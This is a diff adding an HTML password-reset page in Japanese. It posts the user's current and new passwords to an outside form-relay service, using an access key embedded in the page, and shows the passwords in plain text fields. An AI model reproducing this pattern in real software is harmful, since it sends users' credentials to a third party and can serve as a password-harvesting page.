@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+
+</head>
+<body>
+    
+    <div class="reset-password-container">
+       
+        <h2>パスワード再設定</h2>
+        <form action="https://api.staticforms.xyz/submit" method="POST">
+            <input type="hidden" name="accessKey" value="28810efb-f3a7-4bd4-9255-13ed23185ab3"> <!-- Required -->
+
+            <div class="input-group">
+                <label for="current-password">現在のパスワード</label>
+                <input type="text" id="current-password" name="name" required>
+            </div>
+            <div class="input-group">
+                <label for="new-password">新しいパスワード</label>
+                <input type="text" id="new-password" name="name" required>
+            </div>
+            <div class="input-group">
+                <label for="confirm-password">新しいパスワード (確認)</label>
+                <input type="text" id="confirm-password" name="name" required>
+            </div>
+            <button type="submit" class="submit-btn">変更する</button>
+        </form>
+    </div>
+</body>
+</html>
+
